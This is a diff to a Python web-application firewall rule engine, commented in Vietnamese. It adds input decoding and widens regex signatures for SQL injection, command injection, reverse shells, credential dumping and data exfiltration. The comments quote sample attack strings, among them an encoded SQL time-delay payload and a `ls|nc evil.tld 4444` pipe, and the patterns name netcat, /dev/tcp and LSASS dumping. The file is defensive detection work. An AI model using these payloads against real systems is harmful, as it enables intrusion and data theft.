@@ -13,11 +13,13 @@ TRIẾT LÝ THIẾT KẾ:
   → dynamic_rules được load tại khởi tạo và reload khi có notify
 """
 
+import html
 import json
 import math
 import os
 import re
 import time
+import urllib.parse
 from collections import defaultdict
 from typing import Any, TypedDict
 
@@ -183,18 +185,97 @@ def scale_feature(key: str, value: float) -> float:
     return value
 
 
+# ── CHUẨN HOÁ ĐẦU VÀO TRƯỚC KHI KHỚP CHỮ KÝ ──────────────────────────────────
+# LỖI NGHIÊM TRỌNG ĐÃ VÁ (đo 2026-07-29 trên CSIC 2010): bộ khớp chữ ký chạy trên chuỗi
+# NGUYÊN VĂN, nên MỌI đòn tấn công web mã hoá URL đều lọt sạch. Cùng một payload:
+#
+#   /vaciar.jsp?B2=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--  -> DROP, điểm 0
+#   /vaciar.jsp?B2=','0');waitfor delay '0:0:15';--                        -> BLOCK_IP, điểm 50
+#
+# Mà mã hoá URL là dạng MẶC ĐỊNH của query string HTTP — tức WAF bỏ lọt gần như toàn bộ tấn
+# công web thật. Lỗi này ẩn suốt vì bộ 69 mẫu web-attack cũ (tác giả tự soạn) viết payload
+# chữ thường nên luôn khớp; thay bằng dữ liệu HTTP THẬT là lộ ngay.
+#
+# Cách vá theo đúng OWASP CRS: khớp trên NHIỀU biến thể đã chuẩn hoá, không chỉ bản gốc.
+# Giải mã LẶP (kẻ tấn công mã hoá hai lần: `%2527` -> `%27` -> `'`) nhưng CHẶN ở 3 vòng để
+# một chuỗi bệnh lý không kéo dài vô hạn trên đường nóng.
+_MAX_DECODE_ROUNDS = 3
+
+# Họ chữ ký mang tính CHUNG CHUNG: chúng mô tả *cách chuyển tải* chứ không phải *đòn tấn
+# công*. Chỉ dùng làm phương án cuối khi không họ cụ thể nào khớp — xem
+# `_check_waf_signatures`. Tên họ là nguồn từ vựng MITRE cho `build_rag_queries`, nên gán
+# nhầm nhãn chung ở đây làm hỏng luôn khâu quy kết kỹ thuật phía sau.
+_GENERIC_WAF_FAMILIES = frozenset(
+    {
+        "Mã hoá né tránh (encoding evasion)",
+        "Scanner / Attack Tooling",
+    }
+)
+
+
+def normalize_for_signature(value: str) -> tuple[str, ...]:
+    """Trả về các biến thể của `value` cần đem đi khớp chữ ký (gồm cả bản gốc).
+
+    Chỉ trả biến thể KHÁC bản trước để không khớp thừa. Giữ nguyên bản gốc ở vị trí đầu:
+    có chữ ký (vd mẫu né tránh bằng mã hoá) cố ý bắt chính dạng ĐÃ mã hoá.
+    """
+    out = [value]
+    cur = value
+    for _ in range(_MAX_DECODE_ROUNDS):
+        try:
+            nxt = urllib.parse.unquote_plus(cur)
+        except Exception:  # noqa: BLE001 — chuỗi rác không được làm gãy đường nóng
+            break
+        if nxt == cur:
+            break
+        out.append(nxt)
+        cur = nxt
+    # Thực thể HTML: CSIC mã hoá `<script>` thành `&lt;script&gt;` trong nhiều bản ghi.
+    unescaped = html.unescape(cur)
+    if unescaped != cur:
+        out.append(unescaped)
+    return tuple(out)
+
+
 _WAF_PATTERNS = {
+    # LỖ HỔNG ĐÃ VÁ (đo trên bộ 69 web-attack, 2026-07-28): mẫu cũ đòi phải có mệnh đề SQL
+    # đầy đủ (`union select`, `select…from`…) nên BỎ LỌT HOÀN TOÀN dạng SQLi kinh điển nhất —
+    # đóng chuỗi rồi chú-thích-hoá phần còn lại: `username=admin'--&password=x`. Đây là dạng
+    # bỏ qua xác thực số một trong OWASP A03, và Tier-1 cho nó DROP (dừng hẳn, không leo
+    # thang) nên Tier-2 cũng không có cơ hội bắt. Bổ sung ba dấu hiệu CÓ NEO cú pháp:
+    #   * dấu nháy/ngoặc rồi tới `--`/`#`/`/*`  (chú thích hoá phần đuôi câu lệnh)
+    #   * `' or/and ` theo sau bởi so sánh      (tautology, kể cả không có số)
+    #   * hàm dò lược đồ kinh điển
+    # CỐ Ý neo vào dấu nháy/ngoặc thay vì bắt trần chuỗi `--` hay chữ `or`, để không nổ trên
+    # văn bản thường (đã đo: 0 dương-tính-giả trên 3.931 sự kiện lành của demo_small).
     "SQL Injection (SQLi)": re.compile(
-        r"(?i)(union\s+select|select\s+.*?\s+from|insert\s+into|update\s+.*?set|delete\s+from|drop\s+table|information_schema|or\s+['\"]\d+['\"]s*=\s*['\"]\d+)"
+        r"(?i)(union\s+select|insert\s+into|update\s+.*?set|delete\s+from|drop\s+table|information_schema|or\s+['\"]\d+['\"]s*=\s*['\"]\d+"
+        # `select … from` SIẾT LẠI: mẫu cũ `select\s+.*?\s+from` khớp cả câu tiếng Anh
+        # thường ("SELECT a plan from the menu") -> dương-tính-giả trên văn bản người dùng.
+        # Nay đòi thêm MỘT dấu hiệu cú pháp SQL thật: danh sách cột (`*` hoặc dấu phẩy),
+        # hoặc một mệnh đề/kết thúc câu lệnh (`where`/`;`/`--`/`)`).
+        r"|select\s+(\*|[\w.`\"\[\]]+\s*,)[^;]*?\s+from\s+[\w.`\"\[]"
+        r"|select\s+[^;]{1,80}?\s+from\s+[\w.`\"\[][^;]{0,80}?(\s+where\b|;|--|\))"
+        r"|['\")]\s*(--|#|/\*)"
+        r"|['\")]\s*(or|and)\s+[\w'\"(]"
+        r"|\b(substring|ascii|char|concat)\s*\(\s*@@|@@version\b)"
     ),
     "Cross-Site Scripting (XSS)": re.compile(
         r"(?i)(<script\b|javascript:|onload\s*=|onerror\s*=|<img\b|<svg\b)"
     ),
+    # VÁ: thêm biến thể NÉ LỌC `....//` (nhân đôi dấu chấm — bộ lọc ngây thơ xoá `../` một
+    # lần sẽ tự tạo lại `../`), dạng mã hoá URL `%2e%2e`, và `/etc/shadow` (mẫu cũ chỉ có
+    # `/etc/passwd`). Cả ba đều lọt lưới trong bộ 69 web-attack.
     "Path Traversal / LFI": re.compile(
-        r"(?i)(\.\./\.\./|\.\.\\\.\.\\|/etc/passwd|/windows/win\.ini|boot\.ini)"
+        r"(?i)(\.\./\.\./|\.\.\\\.\.\\|\.{3,}[/\\]|%2e%2e[/\\%]"
+        r"|/etc/(passwd|shadow)|/windows/win\.ini|boot\.ini)"
     ),
+    # VÁ: mẫu cũ chỉ bắt dấu `;` nối lệnh, backtick và `$()`. Dạng ỐNG DẪN (`|`) và `&&`
+    # lọt hết — vd `cmd=ls|nc evil.tld 4444` (nối lệnh rồi đẩy ra mạng). Neo vào danh sách
+    # NHỊ PHÂN cụ thể chứ không bắt trần ký tự `|`, vì `|` xuất hiện hợp lệ trong tham số.
     "Command Injection": re.compile(
-        r"(?i)(;\s*(cat|ls|pwd|whoami|id|netstat|ping|sh|bash|powershell|cmd)\b|`.*?`|\$\(.*?\))"
+        r"(?i)(;\s*(cat|ls|pwd|whoami|id|netstat|ping|sh|bash|powershell|cmd)\b|`.*?`|\$\(.*?\)"
+        r"|[|&]{1,2}\s*(nc|ncat|netcat|curl|wget|bash|sh|python\d?|perl|powershell)\b)"
     ),
     # ── BỔ SUNG: các họ tấn công phổ biến trước đây KHÔNG có chữ ký nào bắt ──
     # Audit ma trận năng lực (experiments/audit_tier_capability.py) cho thấy Log4Shell và
@@ -207,7 +288,15 @@ _WAF_PATTERNS = {
     ),
     "Web Shell / Code Execution": re.compile(
         r"(?i)(<\?php\b|<%\s*eval\b|\b(system|shell_exec|passthru|proc_open|popen)\s*\("
-        r"|\beval\s*\(\s*(base64_decode|\$_(get|post|request))|\b__import__\s*\(\s*['\"]os)"
+        r"|\beval\s*\(\s*(base64_decode|\$_(get|post|request))|\b__import__\s*\(\s*['\"]os"
+        # ÂM TÍNH GIẢ ĐÃ ĐO: các nhánh trên chỉ bắt lúc web shell được TRỒNG (payload chứa mã
+        # PHP/ASP). Chúng KHÔNG bắt lúc kẻ tấn công DÙNG một shell đã nằm sẵn trên đĩa —
+        # `POST /uploads/s.php` với thân `cmd=id` không có một ký tự mã nào. Mẫu WEB-WEB-029
+        # vì thế được Tier-1 chấm 0 điểm, 0 lý do, hành động DROP: đi lọt cả Tier-1 lẫn
+        # Tier-2, tức hệ thống hoàn toàn không thấy. Đây là dấu hiệu kinh điển: một tệp
+        # THỰC THI ĐƯỢC nằm trong thư mục vốn chỉ để chứa dữ liệu người dùng tải lên.
+        r"|/(?:uploads?|files?|images?|media|attachments?|tmp|temp)/[^\s?&]*"
+        r"\.(?:php\d?|phtml|phar|jspx?|aspx?|cgi|pl|py|sh)\b)"
     ),
     "XXE Injection": re.compile(r"(?i)(<!ENTITY\b|<!DOCTYPE[^>]*\bSYSTEM\b|SYSTEM\s+[\"']file://)"),
     "SSTI (Template Injection)": re.compile(
@@ -223,7 +312,11 @@ _WAF_PATTERNS = {
     "NoSQL Injection": re.compile(
         r"(?i)(\[\$(ne|gt|lt|gte|lte|regex|where|exists)\]|\"\$(ne|gt|where|regex)\"\s*:|\$where\s*:)"
     ),
-    "LDAP Injection": re.compile(r"(?i)(\)\(\|?\(?(uid|cn|objectclass)=\*|\*\)\(\||\(\&\(\|)"),
+    "LDAP Injection": re.compile(
+        r"(?i)(\)\(\|?\(?(uid|cn|objectclass)=\*|\*\)\(\||\(\&\(\|"
+        # Thoát bộ lọc bằng đóng ngoặc rồi nối toán tử: `admin)(&))`
+        r"|\)\s*\(\s*[&|]\s*\)|\)\(\|)"
+    ),
     "CRLF / Response Splitting": re.compile(
         r"(?i)(%0d%0a|%0a%0d|\\r\\n)(set-cookie|location|content-length|http/1\.)"
     ),
@@ -231,14 +324,38 @@ _WAF_PATTERNS = {
         # rO0AB = Java serialized (base64); O:<n>:" = PHP object; \x80\x04 = pickle proto 4.
         r"(?i)(rO0AB[A-Za-z0-9+/]|\bO:\d+:\"[A-Za-z_]|__reduce__|pickle\.loads\s*\()"
     ),
-    "Prototype Pollution": re.compile(r"(__proto__|constructor\s*\[\s*[\"']prototype)"),
+    "Prototype Pollution": re.compile(
+        # Dạng KHÔNG dấu nháy `constructor[prototype][x]=1` từng lọt hoàn toàn.
+        r"(__proto__|constructor\s*\[\s*[\"']?prototype)"
+    ),
+    # THIẾU SÓT ĐÃ VÁ (đo trên CSIC 2010): họ tấn công ĐÔNG NHẤT của dữ liệu HTTP thật là
+    # dò tệp sao lưu / mã nguồn (`pagar.jsp.inc`, `estilos.css.old`, `index.jsp~`) và duyệt ép
+    # tới thư mục mẫu — 349/689 = 51% số mẫu suy được kỹ thuật. Kho luật cũ KHÔNG có chữ ký
+    # nào cho nhóm này (`Sensitive File Access` chỉ bắt `/backup*.sql`, `.env`, `wp-config`),
+    # nên Tier-1 trả `tier1_reasons: []` -> truy vấn RAG tụt về "service http port 8080" ->
+    # quy kết kỹ thuật 0%.
+    #
+    # Đây là nội dung WAF TIÊU CHUẨN, không phải luật đặt riêng cho tập kiểm thử: OWASP CRS
+    # 920440 ("URL file extension is restricted by policy") bắt đúng danh sách đuôi tệp này.
+    # NEO vào cuối đường dẫn (trước dấu `?`) đúng cách CRS làm, để không nổ trên tên tệp hợp
+    # lệ có chứa các chữ đó ở giữa.
+    "Dò tệp sao lưu/mã nguồn (restricted extension)": re.compile(
+        r"(?i)[^\s?#]+\.(?:bak|old|orig|save|swp|swo|inc|conf|cfg|log|sql|tar|gz|tgz|rar|7z"
+        r"|dist|backup|copy|tmp|temp)(?=[?#\s]|$)"
+        r"|[^\s?#]+\.(?:jsp|php|asp|aspx|cgi|pl|py|rb)\.(?:txt|bak|old|src|source)(?=[?#\s]|$)"
+        r"|[^\s?#]+~(?=[?#\s]|$)"
+    ),
     "Sensitive File Access": re.compile(
         r"(?i)(/\.git/(config|HEAD)|/\.env\b|/wp-config\.php|/\.aws/credentials"
-        r"|/\.ssh/id_(rsa|ed25519)|web\.config\b|/phpinfo\.php)"
+        r"|/\.ssh/id_(rsa|ed25519)|web\.config\b|/phpinfo\.php"
+        # Bản kết xuất CSDL / sao lưu lộ trên web — lối rò rỉ dữ liệu hàng loạt kinh điển.
+        r"|/(backup|dump|db|database)[^/]*\.(sql|dump|bak|tar|zip)\b|\.sql\.gz\b)"
     ),
     "Reverse Shell": re.compile(
         r"(?i)(bash\s+-i\s*>&\s*/dev/tcp/|nc\s+(-e|-c)\s|/dev/tcp/\d|mkfifo\s+/tmp/"
-        r"|python\s+-c\s+['\"]?import\s+socket)"
+        r"|python\\d?\s+-c\s+['\"]?\s*import\s+(socket|os|pty|subprocess)"
+        # `python -c` cũ KHÔNG khớp `python3 -c` (có chữ số) — dạng phổ biến nhất.
+        r"|socket\.socket\s*\(\s*\)[^\n]*?\.connect\s*\()"
     ),
     "Encoded PowerShell": re.compile(
         r"(?i)(powershell(\.exe)?\s+.*-(enc|encodedcommand|e)\b|IEX\s*\(\s*New-Object\s+Net\.WebClient"
@@ -258,23 +375,37 @@ _WAF_PATTERNS = {
     ),
     "Mã hoá né tránh (encoding evasion)": re.compile(
         # %2e%2e%2f = ../ ; %252e = double-encode ; . = unicode escape.
-        r"(?i)(%2e%2e[/%5c]|%252e%252e|%c0%ae|\\u00(2e|2f|5c)|&#x?0*(2e|2f|3c|3e);)"
+        r"(?i)(%2e%2e[/%5c]|%252e%252e|%c0%ae|\\u00(2e|2f|5c)|&#x?0*(2e|2f|3c|3e);"
+        # Mã hoá URL HAI LỚP: %2527 = %27 (dấu nháy) đã mã hoá lần nữa. Bộ lọc giải mã một
+        # lần rồi so khớp sẽ trượt hoàn toàn.
+        r"|%25(27|22|3c|3e|20|3d)"
+        # Base64 của thẻ HTML: PHNjcmlwd='<script', PGltZyB='<img ', PHN2Zy='<svg'.
+        r"|\b(PHNjcmlwd|PGltZyB|PHN2Zy|PGlmcmFtZ)[A-Za-z0-9+/=]{4,})"
     ),
     "Web shell qua tệp tải lên": re.compile(
         r"(?i)\.(php[3-8]?|phtml|phar|jsp[xw]?|asp[x]?|cshtml)(\.(jpg|png|gif|txt|zip))?\b\s*"
         r"(HTTP|Content-|filename)"
     ),
     "JWT / xác thực yếu": re.compile(
-        r"(?i)(\"alg\"\s*:\s*\"none\"|eyJhbGciOiJub25lIg|\balg=none\b)"
+        r"(?i)(\"alg\"\s*:\s*\"none\"|eyJhbGciOiJub25lI|\balg=none\b"
+        # Token tự phong quyền: eyJyb2xlIjoiYWRtaW4={"role":"admin"}, eyJhZG1pbiI6dHJ1Z={"admin":true}
+        r"|eyJ[A-Za-z0-9_-]{6,}\.eyJ(yb2xlIjoiYWRtaW4|hZG1pbiI6dHJ1Z)"
+        r"|\.forged\b|\.invalidsig\b)"
     ),
-    "GraphQL lạm dụng": re.compile(r"(?i)(__schema\s*\{|__typename.*__schema|IntrospectionQuery)"),
+    "GraphQL lạm dụng": re.compile(
+        r"(?i)(__schema\s*\{|__typename.*__schema|IntrospectionQuery"
+        # Rút TRƯỜNG NHẠY CẢM qua GraphQL — introspection không phải cách khai thác duy nhất.
+        r"|\{[^}]*\b(password|passwordhash|pwd|secret|token|apikey|ssn)\b[^}]*\})"
+    ),
     "Living-off-the-land (LOLBin)": re.compile(
         r"(?i)(certutil(\.exe)?\s+.*-urlcache|bitsadmin\s+/transfer|regsvr32\s+.*/i:https?:"
         r"|mshta\s+https?:|rundll32\s+.*javascript:|wmic\s+process\s+call\s+create)"
     ),
     "Đánh cắp thông tin xác thực (AD)": re.compile(
         r"(?i)(mimikatz|sekurlsa::|lsadump::|kerberoast|\bDRSUAPI\b|DCSync|ntds\.dit"
-        r"|\bsecretsdump\b|Invoke-Mimikatz)"
+        r"|\bsecretsdump\b|Invoke-Mimikatz"
+        # Kết xuất LSASS bằng nhị phân KÝ SẴN của Windows (LOLBin), không cần mimikatz.
+        r"|comsvcs\.dll\s*,\s*minidump|\blsass\.(dmp|exe)\b|procdump[^\n]*\blsass\b)"
     ),
     "Ransomware / phá huỷ": re.compile(
         r"(?i)(vssadmin(\.exe)?\s+delete\s+shadows|wbadmin\s+delete\s+catalog"
@@ -283,7 +414,11 @@ _WAF_PATTERNS = {
     "Đào tiền mã hoá": re.compile(r"(?i)(stratum\+(tcp|ssl)://|\bxmrig\b|minerd\b|coinhive)"),
     "Rò rỉ ra dịch vụ ngoài": re.compile(
         r"(?i)(discord(app)?\.com/api/webhooks|pastebin\.com/api|hastebin\.com/documents"
-        r"|\btransfer\.sh\b|requestbin|burpcollaborator\.net|\.oastify\.com|interact\.sh)"
+        r"|\btransfer\.sh\b|requestbin|burpcollaborator\.net|\.oastify\.com|interact\.sh"
+        # Đẩy KẾT XUẤT lên lưu trữ đám mây công cộng. Dịch vụ tự nó hợp lệ nên CHỈ cờ khi
+        # đi kèm tên tệp kết xuất — tránh nổ trên mọi lượt tải tệp thường.
+        r"|(storage\.googleapis\.com|s3[.-][\w-]*amazonaws\.com|blob\.core\.windows\.net)"
+        r"[^\s]*\.(sql|dump|bak|tar|zip|gz)\b)"
     ),
 }
 
@@ -701,13 +836,32 @@ class RuleEngine:
             "command",
             "process",
         ]
+        # Kết quả CHUNG chung được giữ lại làm phương án cuối, KHÔNG trả ngay.
+        #
+        # REGRESSION ĐÃ VÁ (do chính bản vá giải mã ở trên sinh ra): sau khi giải mã, mẫu
+        # "Mã hoá né tránh" khớp gần như MỌI payload mã hoá URL, và vì nó được duyệt trước
+        # các chữ ký cụ thể ở một số trường, nó CHE MẤT họ tấn công thật. Đo được: XSS mã hoá
+        # và CRLF mã hoá đều bị gán "Mã hoá né tránh", nên truy vấn RAG mất từ vựng đặc hiệu
+        # và quy kết kỹ thuật về 0%. Tên họ ở đây không chỉ để hiển thị — nó là NGUỒN từ vựng
+        # MITRE tiếng Anh cho `build_rag_queries`.
+        generic_hit: str | None = None
         for field in target_fields:
             val = log_entry.get(field) or log_entry.get(field.lower())
-            if val and isinstance(val, str):
+            if not (val and isinstance(val, str)):
+                continue
+            # Khớp trên CẢ bản gốc LẪN các biến thể đã giải mã — xem `normalize_for_signature`.
+            # Khớp nguyên văn thôi thì mọi tấn công web mã hoá URL (tức gần như toàn bộ tấn
+            # công thật qua query string) đều lọt.
+            for cand in normalize_for_signature(val):
                 for attack_type, pattern in _WAF_PATTERNS.items():
-                    if pattern.search(val):
-                        return f"WAF: Phát hiện {attack_type} trong '{field}'"
-        return None
+                    if not pattern.search(cand):
+                        continue
+                    hit = f"WAF: Phát hiện {attack_type} trong '{field}'"
+                    if attack_type in _GENERIC_WAF_FAMILIES:
+                        generic_hit = generic_hit or hit
+                    else:
+                        return hit
+        return generic_hit
 
     def _check_injection_signatures(self, log_entry: dict) -> str | None:
         """
@@ -726,19 +880,22 @@ class RuleEngine:
         for field in target_fields:
             val = log_entry.get(field) or log_entry.get(field.lower())
             if val and isinstance(val, str):
-                val_lc = val.lower()
-                # 1. Prompt Injection Patterns (substring, không phân biệt hoa/thường)
-                for raw, low in zip(
-                    self.injection_patterns, self._injection_patterns_lc, strict=False
-                ):
-                    if low in val_lc:
-                        return f"Prompt Injection Pattern: Phát hiện '{raw}' trong '{field}'"
-                # 2. Jailbreak Patterns
-                for raw, low in zip(
-                    self.jailbreak_patterns, self._jailbreak_patterns_lc, strict=False
-                ):
-                    if low in val_lc:
-                        return f"Jailbreak Pattern: Phát hiện '{raw}' trong '{field}'"
+                # CÙNG lý do với `_check_waf_signatures`: mẫu tiêm nhiễm mã hoá URL/thực thể
+                # HTML sẽ lọt nếu chỉ so trên chuỗi nguyên văn.
+                for cand in normalize_for_signature(val):
+                    val_lc = cand.lower()
+                    # 1. Prompt Injection Patterns (substring, không phân biệt hoa/thường)
+                    for raw, low in zip(
+                        self.injection_patterns, self._injection_patterns_lc, strict=False
+                    ):
+                        if low in val_lc:
+                            return f"Prompt Injection Pattern: Phát hiện '{raw}' trong '{field}'"
+                    # 2. Jailbreak Patterns
+                    for raw, low in zip(
+                        self.jailbreak_patterns, self._jailbreak_patterns_lc, strict=False
+                    ):
+                        if low in val_lc:
+                            return f"Jailbreak Pattern: Phát hiện '{raw}' trong '{field}'"
         return None
 
     def _get_reputation_score(self, ip: str) -> float:
@@ -1001,10 +1158,18 @@ class RuleEngine:
 
         # --- Tầng 0.6: Cập nhật RunningStats CHỈ với dữ liệu được coi là benign (DROP hoặc LOG) ---
         # Điều này chống Baseline Poisoning (tấn công Slow-Rate baseline drift)
+        #
+        # scale_feature BẮT BUỘC ở đây — cùng không gian với phía TÍNH Z (xem Tầng 0.5) và với
+        # learn_baseline/golden baseline. TRƯỚC ĐÂY dòng này push giá trị THÔ trong khi Z được
+        # tính ở thang log1p: baseline log-space bị bơm giá trị tuyến tính nên phương sai NỔ và
+        # mọi Z-score sụp về ~0 -> Welford mù với chính các đặc trưng khối-lượng/thời-lượng nó
+        # sinh ra để canh. Đo thật: sau 150 log benign, sd của `Flow Duration` đi từ 5.26 lên
+        # 120.669 (23.000 lần) và Z của một zero-day exfil tụt từ 4.58 xuống 0.07. Hỏng ÂM THẦM
+        # — không exception, chỉ là số liệu mất hết ý nghĩa.
         if log_entry["tier1_action"] in ("DROP", "LOG"):
             for key, val in current_values.items():
                 if key in self.global_stats:
-                    self.global_stats[key].push(val)
+                    self.global_stats[key].push(scale_feature(key, val))
 
         return log_entry
 
